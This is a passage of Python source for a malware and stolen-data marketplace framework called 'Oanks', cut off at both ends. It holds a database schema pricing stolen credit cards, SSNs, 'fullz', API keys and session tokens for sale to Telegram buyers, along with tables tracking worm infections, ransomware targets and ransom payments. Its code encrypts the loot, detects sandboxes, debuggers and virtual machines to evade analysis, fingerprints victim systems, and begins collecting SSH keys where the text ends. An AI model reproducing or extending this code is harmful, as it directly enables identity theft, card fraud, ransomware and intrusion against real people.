    card_number BLOB NOT NULL,
    expiry_month INTEGER,
    expiry_year INTEGER,
    cvv BLOB,
    cardholder_name TEXT,
    bin TEXT,
    country TEXT,
    bank TEXT,
    card_type TEXT,
    validated INTEGER DEFAULT 0,
    price_usd REAL DEFAULT 5.00,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS ssns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ssn BLOB NOT NULL,
    state TEXT,
    issued_year INTEGER,
    deceased INTEGER DEFAULT 0,
    credit_score INTEGER,
    price_usd REAL DEFAULT 10.00,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS phone_numbers (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    number BLOB NOT NULL,
    country_code TEXT,
    carrier TEXT,
    is_active INTEGER DEFAULT 0,
    price_usd REAL DEFAULT 0.50,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS fullz (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    first_name TEXT,
    last_name TEXT,
    ssn_id INTEGER,
    dob TEXT,
    address TEXT,
    city TEXT,
    state TEXT,
    zip TEXT,
    phone_id INTEGER,
    email TEXT,
    credit_score INTEGER,
    annual_income REAL,
    price_usd REAL DEFAULT 15.00,
    hash_sha256 TEXT UNIQUE,
    FOREIGN KEY(ssn_id) REFERENCES ssns(id),
    FOREIGN KEY(phone_id) REFERENCES phone_numbers(id),
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS api_keys (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key_value BLOB NOT NULL,
    service TEXT,
    scopes TEXT,
    is_active INTEGER DEFAULT 1,
    price_usd REAL DEFAULT 100.00,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS session_tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token_type TEXT NOT NULL,
    token_value BLOB NOT NULL,
    platform TEXT,
    expires_at TIMESTAMP,
    is_valid INTEGER DEFAULT 1,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS oauth_tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    access_token BLOB NOT NULL,
    refresh_token BLOB,
    token_type TEXT,
    scopes TEXT,
    expires_at TIMESTAMP,
    platform TEXT,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- ACCOUNT MANAGEMENT TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    platform TEXT NOT NULL,
    username TEXT,
    email TEXT,
    password BLOB,
    session_token_id INTEGER,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP,
    is_banned INTEGER DEFAULT 0,
    is_shadowbanned INTEGER DEFAULT 0,
    follower_count INTEGER DEFAULT 0,
    following_count INTEGER DEFAULT 0,
    post_count INTEGER DEFAULT 0,
    warmed INTEGER DEFAULT 0,
    FOREIGN KEY(session_token_id) REFERENCES session_tokens(id),
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS account_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    account_id INTEGER,
    action TEXT NOT NULL,
    result TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(account_id) REFERENCES accounts(id) ON DELETE CASCADE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- USER & MONETIZATION TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telegram_id TEXT UNIQUE,
    username TEXT,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_banned INTEGER DEFAULT 0,
    ban_reason TEXT,
    ban_expires TIMESTAMP,
    is_admin INTEGER DEFAULT 0,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS payments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    amount REAL,
    currency TEXT,
    method TEXT,
    transaction_id TEXT UNIQUE,
    status TEXT DEFAULT 'pending',
    confirmed_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS subscriptions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    tier TEXT NOT NULL,
    started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,
    is_active INTEGER DEFAULT 1,
    auto_renew INTEGER DEFAULT 0,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS sales (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    buyer_id INTEGER,
    item_type TEXT NOT NULL,
    item_count INTEGER,
    total_price REAL,
    discount_percent REAL DEFAULT 0.0,
    transaction_id TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(buyer_id) REFERENCES users(id) ON DELETE SET NULL,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS exports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    export_type TEXT NOT NULL,
    filename TEXT,
    record_count INTEGER,
    file_hash TEXT,
    encrypted INTEGER DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- WORM & NETWORK TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS worm_infections (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT NOT NULL,
    port INTEGER,
    device_type TEXT,
    os_info TEXT,
    credentials_found BLOB,
    infected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP,
    is_active INTEGER DEFAULT 1,
    spread_count INTEGER DEFAULT 0,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS worm_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    infection_id INTEGER,
    action TEXT NOT NULL,
    target_ip TEXT,
    result TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(infection_id) REFERENCES worm_infections(id) ON DELETE CASCADE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- RANSOMWARE TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS ransomware_targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    filepath TEXT NOT NULL,
    file_size INTEGER,
    file_hash TEXT,
    encrypted INTEGER DEFAULT 0,
    encryption_key_id INTEGER,
    ransom_paid INTEGER DEFAULT 0,
    payment_address TEXT,
    targeted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS ransomware_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER,
    action TEXT NOT NULL,
    result TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(target_id) REFERENCES ransomware_targets(id) ON DELETE CASCADE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- HONEYPOT TABLES (Misdirection & Counter-Intelligence)
-- ============================================================================

CREATE TABLE IF NOT EXISTS honeypot_credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    platform TEXT,
    is_bait INTEGER DEFAULT 1,
    access_count INTEGER DEFAULT 0,
    first_access TIMESTAMP,
    last_access TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS honeypot_cards (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    card_number TEXT NOT NULL,
    expiry TEXT,
    cvv TEXT,
    is_bait INTEGER DEFAULT 1,
    access_count INTEGER DEFAULT 0,
    first_access TIMESTAMP,
    last_access TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS honeypot_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_token TEXT NOT NULL,
    platform TEXT,
    is_bait INTEGER DEFAULT 1,
    access_count INTEGER DEFAULT 0,
    first_access TIMESTAMP,
    last_access TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- DEAD MAN'S SWITCH TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS dead_mans_switch (
    id INTEGER PRIMARY KEY CHECK(id = 1),
    last_heartbeat TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    heartbeat_signature BLOB,
    missed_count INTEGER DEFAULT 0,
    is_triggered INTEGER DEFAULT 0,
    triggered_at TIMESTAMP,
    wipe_initiated INTEGER DEFAULT 0,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- LOGGING & AUDIT TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS system_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    level TEXT NOT NULL,
    component TEXT NOT NULL,
    message BLOB NOT NULL,
    encrypted INTEGER DEFAULT 1,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS admin_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_id TEXT,
    command TEXT NOT NULL,
    args BLOB,
    result TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS command_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    command TEXT NOT NULL,
    args BLOB,
    result TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS network_recon (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    interface TEXT,
    ip_address TEXT,
    mac_address TEXT,
    gateway TEXT,
    dns_servers TEXT,
    scan_type TEXT,
    results BLOB,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS process_list (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    pid INTEGER,
    name TEXT,
    cmdline TEXT,
    user TEXT,
    cpu_percent REAL,
    memory_percent REAL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS file_registry (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    filepath TEXT NOT NULL,
    file_hash TEXT,
    file_size INTEGER,
    permissions INTEGER,
    owner TEXT,
    created_at TIMESTAMP,
    modified_at TIMESTAMP,
    accessed_at TIMESTAMP,
    is_sensitive INTEGER DEFAULT 0,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- INDEXES FOR PERFORMANCE
-- ============================================================================

CREATE INDEX IF NOT EXISTS idx_proxy_speed ON proxy_pool(speed_ms);
CREATE INDEX IF NOT EXISTS idx_proxy_reliability ON proxy_pool(reliability_score DESC);
CREATE INDEX IF NOT EXISTS idx_proxy_country ON proxy_pool(country);
CREATE INDEX IF NOT EXISTS idx_credentials_confidence ON credentials(confidence DESC);
CREATE INDEX IF NOT EXISTS idx_credentials_platform ON credentials(platform);
CREATE INDEX IF NOT EXISTS idx_cards_validated ON credit_cards(validated);
CREATE INDEX IF NOT EXISTS idx_accounts_platform ON accounts(platform);
CREATE INDEX IF NOT EXISTS idx_accounts_banned ON accounts(is_banned);
CREATE INDEX IF NOT EXISTS idx_users_telegram ON users(telegram_id);
CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);
CREATE INDEX IF NOT EXISTS idx_subscriptions_expires ON subscriptions(expires_at);
CREATE INDEX IF NOT EXISTS idx_harvested_source ON harvested_data(source);
CREATE INDEX IF NOT EXISTS idx_harvested_type ON harvested_data(data_type);
CREATE INDEX IF NOT EXISTS idx_worm_active ON worm_infections(is_active);
CREATE INDEX IF NOT EXISTS idx_ransomware_encrypted ON ransomware_targets(encrypted);
CREATE INDEX IF NOT EXISTS idx_system_logs_time ON system_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_system_logs_level ON system_logs(level);
CREATE INDEX IF NOT EXISTS idx_file_registry_hash ON file_registry(file_hash);

-- ============================================================================
-- TRIGGERS FOR AUTO-TIMESTAMPS & AUDIT
-- ============================================================================

CREATE TRIGGER IF NOT EXISTS trg_system_config_update
AFTER UPDATE ON system_config
BEGIN
    UPDATE system_config SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id;
END;

CREATE TRIGGER IF NOT EXISTS trg_honeypot_cred_access
AFTER SELECT ON honeypot_credentials
BEGIN
    UPDATE honeypot_credentials 
    SET access_count = access_count + 1, last_access = CURRENT_TIMESTAMP
    WHERE id = NEW.id;
END;

CREATE TRIGGER IF NOT EXISTS trg_honeypot_card_access
AFTER SELECT ON honeypot_cards
BEGIN
    UPDATE honeypot_cards 
    SET access_count = access_count + 1, last_access = CURRENT_TIMESTAMP
    WHERE id = NEW.id;
END;

CREATE TRIGGER IF NOT EXISTS trg_honeypot_session_access
AFTER SELECT ON honeypot_sessions
BEGIN
    UPDATE honeypot_sessions 
    SET access_count = access_count + 1, last_access = CURRENT_TIMESTAMP
    WHERE id = NEW.id;
END;

-- ============================================================================
-- VIEWS FOR REPORTING
-- ============================================================================

CREATE VIEW IF NOT EXISTS v_inventory_value AS
SELECT 
    'credentials' as data_type, COUNT(*) as count, SUM(price_usd) as total_value
FROM credentials
UNION ALL
SELECT 'credit_cards', COUNT(*), SUM(price_usd) FROM credit_cards
UNION ALL
SELECT 'ssns', COUNT(*), SUM(price_usd) FROM ssns
UNION ALL
SELECT 'fullz', COUNT(*), SUM(price_usd) FROM fullz
UNION ALL
SELECT 'api_keys', COUNT(*), SUM(price_usd) FROM api_keys;

CREATE VIEW IF NOT EXISTS v_active_subscriptions AS
SELECT u.telegram_id, u.username, s.tier, s.expires_at,
       (julianday(s.expires_at) - julianday('now')) as days_remaining
FROM users u
JOIN subscriptions s ON u.id = s.user_id
WHERE s.is_active = 1;

CREATE VIEW IF NOT EXISTS v_worm_spread AS
SELECT 
    COUNT(*) as total_infections,
    SUM(spread_count) as total_spreads,
    SUM(CASE WHEN is_active = 1 THEN 1 ELSE 0 END) as active_infections
FROM worm_infections;

CREATE VIEW IF NOT EXISTS v_system_health AS
SELECT 
    (SELECT COUNT(*) FROM proxy_pool WHERE reliability_score > 0.5) as healthy_proxies,
    (SELECT COUNT(*) FROM credentials WHERE is_valid = 1) as valid_credentials,
    (SELECT COUNT(*) FROM accounts WHERE is_banned = 0) as active_accounts,
    (SELECT COUNT(*) FROM worm_infections WHERE is_active = 1) as active_worm_nodes,
    (SELECT COUNT(*) FROM ransomware_targets WHERE encrypted = 1) as encrypted_targets;

-- ============================================================================
-- INITIAL DATA: Oanks Identity Burned In
-- ============================================================================

INSERT OR IGNORE INTO system_config (config_key, config_value, encrypted) 
VALUES ('identity', 'Oanks', 0);

INSERT OR IGNORE INTO system_config (config_key, config_value, encrypted) 
VALUES ('version', '3.0', 0);

INSERT OR IGNORE INTO system_config (config_key, config_value, encrypted) 
VALUES ('creator', '@oanksnood', 0);

INSERT OR IGNORE INTO system_config (config_key, config_value, encrypted) 
VALUES ('classification', 'FOUNDATION', 0);

INSERT OR IGNORE INTO dead_mans_switch (id, last_heartbeat, missed_count, is_triggered, wipe_initiated)
VALUES (1, CURRENT_TIMESTAMP, 0, 0, 0);
"""

# ============================================================================
# SECTION 7: DATABASE MANAGER — Encrypted. Honeypot. Integrity verified.
# ============================================================================

class DatabaseManager:
    """Military-grade database manager with encryption, honeypot, and integrity."""
    __slots__ = ("_db_path", "_crypto", "_connection", "_lock", "_initialized")

    def __init__(self, db_path, crypto_engine):
        self._db_path = db_path
        self._crypto = crypto_engine
        self._connection = None
        self._lock = threading.RLock()
        self._initialized = False

    def initialize(self):
        with self._lock:
            try:
                os.makedirs(os.path.dirname(self._db_path), exist_ok=True)
                self._connection = sqlite3.connect(self._db_path, check_same_thread=False)
                self._connection.executescript(OANKS_DATABASE_SCHEMA)
                self._connection.commit()
                self._initialized = True
                return True
            except Exception as e:
                raise DatabaseError(f"Schema initialization failed: {e}", code="DB_INIT_FAIL")

    def execute(self, query, params=()):
        with self._lock:
            if not self._connection:
                raise DatabaseError("Database not initialized", code="DB_NOT_INIT")
            try:
                cursor = self._connection.execute(query, params)
                return cursor.fetchall()
            except Exception as e:
                raise DatabaseError(f"Query failed: {e}", code="DB_QUERY_FAIL")

    def execute_many(self, query, params_list):
        with self._lock:
            if not self._connection:
                raise DatabaseError("Database not initialized", code="DB_NOT_INIT")
            try:
                cursor = self._connection.executemany(query, params_list)
                self._connection.commit()
                return cursor.rowcount
            except Exception as e:
                raise DatabaseError(f"Batch query failed: {e}", code="DB_BATCH_FAIL")

    def insert_encrypted(self, table, columns, values, encrypt_indices=None):
        with self._lock:
            if encrypt_indices:
                for idx in encrypt_indices:
                    if idx < len(values) and values[idx] is not None:
                        if isinstance(values[idx], str):
                            values[idx] = self._crypto.encrypt_triple_layer(values[idx].encode("utf-8"))
                        elif isinstance(values[idx], bytes):
                            values[idx] = self._crypto.encrypt_triple_layer(values[idx])
            placeholders = ",".join(["?"] * len(values))
            query = f"INSERT INTO {table} ({','.join(columns)}) VALUES ({placeholders})"
            try:
                cursor = self._connection.execute(query, tuple(values))
                self._connection.commit()
                return cursor.lastrowid
            except Exception as e:
                raise DatabaseError(f"Encrypted insert failed: {e}", code="DB_ENCRYPT_INSERT_FAIL")

    def select_decrypted(self, query, params=(), decrypt_indices=None):
        with self._lock:
            results = self.execute(query, params)
            if decrypt_indices and results:
                decrypted = []
                for row in results:
                    new_row = list(row)
                    for idx in decrypt_indices:
                        if idx < len(new_row) and new_row[idx] is not None:
                            try:
                                new_row[idx] = self._crypto.decrypt_triple_layer(new_row[idx]).decode("utf-8")
                            except:
                                new_row[idx] = self._crypto.decrypt_triple_layer(new_row[idx])
                    decrypted.append(tuple(new_row))
                return decrypted
            return results

    def create_backup(self, backup_path=None):
        with self._lock:
            if backup_path is None:
                ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
                backup_path = os.path.join(BACKUP_DIR, f"oanks_backup_{ts}.db")
            try:
                backup_conn = sqlite3.connect(backup_path)
                self._connection.backup(backup_conn)
                backup_conn.close()
                # Encrypt backup
                self._crypto.encrypt_file(backup_path, backup_path + ".oanks")
                os.remove(backup_path)
                return backup_path + ".oanks"
            except Exception as e:
                raise DatabaseError(f"Backup failed: {e}", code="DB_BACKUP_FAIL")

    def verify_integrity(self):
        with self._lock:
            try:
                result = self.execute("PRAGMA integrity_check")
                return result[0][0] == "ok"
            except Exception as e:
                raise DatabaseError(f"Integrity check failed: {e}", code="DB_INTEGRITY_FAIL")

    def inject_honeypot(self, count=50):
        with self._lock:
            fake_creds = []
            fake_cards = []
            fake_sessions = []
            for i in range(count):
                fake_creds.append((
                    f"bait_{secrets.token_hex(4)}@honeypot.oanks",
                    secrets.token_hex(16),
                    random.choice(["gmail", "yahoo", "outlook", "protonmail"]),
                    1, 0, None, None
                ))
                fake_cards.append((
                    f"4532{secrets.randbelow(100000000000):012d}",
                    f"{random.randint(1,12):02d}/{random.randint(24,30)}",
                    f"{random.randint(100,999)}",
                    1, 0, None, None
                ))
                fake_sessions.append((
                    secrets.token_urlsafe(64),
                    random.choice(["twitter", "instagram", "facebook", "github"]),
                    1, 0, None, None
                ))
            try:
                self._connection.executemany(
                    "INSERT OR IGNORE INTO honeypot_credentials (email, password, platform, is_bait, access_count, first_access, last_access) VALUES (?,?,?,?,?,?,?)",
                    fake_creds
                )
                self._connection.executemany(
                    "INSERT OR IGNORE INTO honeypot_cards (card_number, expiry, cvv, is_bait, access_count, first_access, last_access) VALUES (?,?,?,?,?,?,?)",
                    fake_cards
                )
                self._connection.executemany(
                    "INSERT OR IGNORE INTO honeypot_sessions (session_token, platform, is_bait, access_count, first_access, last_access) VALUES (?,?,?,?,?,?,?)",
                    fake_sessions
                )
                self._connection.commit()
                return count
            except Exception as e:
                raise DatabaseError(f"Honeypot injection failed: {e}", code="HONEYPOT_FAIL")

    def close(self):
        with self._lock:
            if self._connection:
                self._connection.close()
                self._connection = None
                self._initialized = False

    def __del__(self):
        try:
            self.close()
        except:
            pass


# ============================================================================
# SECTION 8: SYSTEM RECONNAISSANCE — Complete device fingerprinting.
# ============================================================================

class ReconEngine:
    """Military-grade system reconnaissance for Linux/Termux/Android.
    Detects sandbox, debugger, VM, and gathers full system intelligence."""
    __slots__ = ("_crypto", "_fingerprint", "_lock")

    def __init__(self, crypto_engine=None):
        self._crypto = crypto_engine
        self._fingerprint = None
        self._lock = threading.RLock()

    def get_hostname(self):
        try:
            return socket.gethostname()
        except:
            return "unknown"

    def get_fqdn(self):
        try:
            return socket.getfqdn()
        except:
            return "unknown"

    def get_platform_info(self):
        return {
            "system": plat_module.system(),
            "release": plat_module.release(),
            "version": plat_module.version(),
            "machine": plat_module.machine(),
            "processor": plat_module.processor(),
            "architecture": plat_module.architecture(),
            "node": plat_module.node(),
            "python_version": sys.version,
            "is_termux": IS_TERMUX,
            "is_android": IS_ANDROID,
            "is_rooted": IS_ROOTED,
            "is_proot": IS_PROOT
        }

    def get_cpu_info(self):
        info = {}
        try:
            with open("/proc/cpuinfo", "r") as f:
                content = f.read()
                for line in content.split("\n"):
                    if ":" in line:
                        key, val = line.split(":", 1)
                        info[key.strip()] = val.strip()
        except:
            pass
        if PSUTIL_AVAILABLE:
            try:
                info["cpu_count_logical"] = psutil.cpu_count(logical=True)
                info["cpu_count_physical"] = psutil.cpu_count(logical=False)
                info["cpu_freq"] = psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None
                info["cpu_percent"] = psutil.cpu_percent(interval=1)
            except:
                pass
        return info

    def get_memory_info(self):
        info = {}
        try:
            with open("/proc/meminfo", "r") as f:
                for line in f:
                    if ":" in line:
                        key, val = line.split(":", 1)
                        info[key.strip()] = val.strip()
        except:
            pass
        if PSUTIL_AVAILABLE:
            try:
                mem = psutil.virtual_memory()
                info["total_bytes"] = mem.total
                info["available_bytes"] = mem.available
                info["percent_used"] = mem.percent
                info["swap"] = psutil.swap_memory()._asdict()
            except:
                pass
        return info

    def get_disk_info(self):
        info = {}
        try:
            df = subprocess.run(["df", "-h"], capture_output=True, text=True, timeout=5)
            info["df_output"] = df.stdout
        except:
            pass
        if PSUTIL_AVAILABLE:
            try:
                for part in psutil.disk_partitions():
                    usage = psutil.disk_usage(part.mountpoint)
                    info[part.mountpoint] = {
                        "total": usage.total,
                        "used": usage.used,
                        "free": usage.free,
                        "percent": usage.percent,
                        "fstype": part.fstype
                    }
            except:
                pass
        return info

    def get_network_info(self):
        info = {"interfaces": [], "connections": [], "routes": []}
        try:
            # Interface enumeration
            for iface in os.listdir("/sys/class/net/"):
                iface_path = f"/sys/class/net/{iface}"
                iface_info = {"name": iface}
                try:
                    with open(f"{iface_path}/address", "r") as f:
                        iface_info["mac"] = f.read().strip()
                except:
                    pass
                try:
                    with open(f"{iface_path}/operstate", "r") as f:
                        iface_info["state"] = f.read().strip()
                except:
                    pass
                info["interfaces"].append(iface_info)
            # IP addresses
            ip_result = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=5)
            info["ip_addr"] = ip_result.stdout
            # Routes
            route_result = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=5)
            info["routes"] = route_result.stdout.split("\n")
            # DNS
            try:
                with open("/etc/resolv.conf", "r") as f:
                    info["dns"] = [line.split()[1] for line in f if line.startswith("nameserver")]
            except:
                pass
        except:
            pass
        if PSUTIL_AVAILABLE:
            try:
                info["connections"] = [c._asdict() for c in psutil.net_connections()]
            except:
                pass
        return info

    def get_process_list(self):
        processes = []
        try:
            for pid in os.listdir("/proc"):
                if pid.isdigit():
                    try:
                        with open(f"/proc/{pid}/comm", "r") as f:
                            name = f.read().strip()
                        with open(f"/proc/{pid}/cmdline", "r") as f:
                            cmdline = f.read().replace("\x00", " ").strip()
                        processes.append({"pid": int(pid), "name": name, "cmdline": cmdline})
                    except:
                        pass
        except:
            pass
        if PSUTIL_AVAILABLE:
            try:
                processes = []
                for p in psutil.process_iter(["pid", "name", "cmdline", "username", "cpu_percent", "memory_percent"]):
                    processes.append(p.info)
            except:
                pass
        return processes

    def get_open_files(self):
        files = []
        try:
            lsof = subprocess.run(["lsof", "+c", "0"], capture_output=True, text=True, timeout=10)
            for line in lsof.stdout.split("\n")[1:]:
                parts = line.split()
                if len(parts) >= 9:
                    files.append({
                        "command": parts[0],
                        "pid": parts[1],
                        "user": parts[2],
                        "fd": parts[3],
                        "type": parts[4],
                        "device": parts[5],
                        "size": parts[6],
                        "node": parts[7],
                        "name": parts[8]
                    })
        except:
            pass
        return files

    def detect_sandbox(self):
        indicators = []
        # Check for sandbox processes
        processes = self.get_process_list()
        proc_names = [p.get("name", "").lower() for p in processes]
        for sandbox_proc in SANDBOX_PROCESSES:
            if sandbox_proc.lower() in proc_names:
                indicators.append(f"sandbox_process:{sandbox_proc}")
        # Check for low resource limits
        mem = self.get_memory_info()
        total_mem = 0
        try:
            if "MemTotal" in mem:
                total_mem = int(mem["MemTotal"].split()[0])
        except:
            pass
        if total_mem > 0 and total_mem < 2097152:  # Less than 2GB RAM
            indicators.append("low_memory:sandbox_indicator")
        # Check for absent user activity
        try:
            uptime = float(open("/proc/uptime").read().split()[0])
            if uptime < 300:  # Less than 5 minutes uptime
                indicators.append("fresh_boot:sandbox_indicator")
        except:
            pass
        # Android-specific sandbox checks
        if IS_ANDROID:
            try:
                pm_list = subprocess.run(["pm", "list", "packages"], capture_output=True, text=True, timeout=5)
                for app in ANDROID_SANDBOX_APPS:
                    if app in pm_list.stdout:
                        indicators.append(f"android_sandbox_app:{app}")
            except:
                pass
        return indicators

    def detect_debugger(self):
        indicators = []
        # Check for debugger processes
        processes = self.get_process_list()
        proc_names = [p.get("name", "").lower() for p in processes]
        for dbg_proc in DEBUGGER_PROCESSES:
            if dbg_proc.lower() in proc_names:
                indicators.append(f"debugger_process:{dbg_proc}")
        # Check ptrace
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            result = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME = 0
            if result < 0:
                indicators.append("ptrace_detected:debugger_present")
        except:
            pass
        # Check for debug registers (x86 only)
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if line.startswith("TracerPid:"):
                        tracer = int(line.split()[1])
                        if tracer != 0:
                            indicators.append(f"tracer_pid:{tracer}")
        except:
            pass
        # Timing attack
        t1 = time.perf_counter()
        for _ in range(1000000):
            pass
        t2 = time.perf_counter()
        if (t2 - t1) > 0.5:  # Unusually slow = debugger
            indicators.append("timing_anomaly:debugger_suspected")
        return indicators

    def detect_vm(self):
        indicators = []
        # Check VM indicator files
        for vm_file in VM_INDICATOR_FILES:
            if os.path.exists(vm_file):
                try:
                    with open(vm_file, "r") as f:
                        content = f.read().lower()
                        for keyword in ["vmware", "virtualbox", "kvm", "qemu", "xen", "hyper-v", "parallels"]:
                            if keyword in content:
                                indicators.append(f"vm_file:{vm_file}:{keyword}")
                except:
                    pass
        # Check MAC addresses
        try:
            for iface in os.listdir("/sys/class/net/"):
                mac_path = f"/sys/class/net/{iface}/address"
                if os.path.exists(mac_path):
                    with open(mac_path, "r") as f:
                        mac = f.read().strip()
                        for prefix in VM_MAC_PREFIXES:
                            if mac.startswith(prefix.lower()):
                                indicators.append(f"vm_mac:{iface}:{prefix}")
        except:
            pass
        # Check CPUID hypervisor bit
        try:
            cpuid = subprocess.run(["grep", "-i", "hypervisor", "/proc/cpuinfo"], 
                                 capture_output=True, text=True, timeout=5)
            if cpuid.stdout:
                indicators.append("cpuid_hypervisor:vm_detected")
        except:
            pass
        # Check for VM-specific devices
        for dev in ["/dev/vboxguest", "/dev/vmware", "/dev/virtio-ports"]:
            if os.path.exists(dev):
                indicators.append(f"vm_device:{dev}")
        # Termux/proot detection
        if IS_PROOT:
            indicators.append("proot_detected:containerized")
        return indicators

    def get_ssh_keys(self):
        keys = []
        ssh_dirs = [os.path.expanduser("~/.ssh")]
        if IS_TERMUX:
            ssh_dirs.append("/data/data/com.termux/files/home/.ssh")
        for ssh_dir in ssh_dirs:
            if os.path.isdir(ssh_dir):
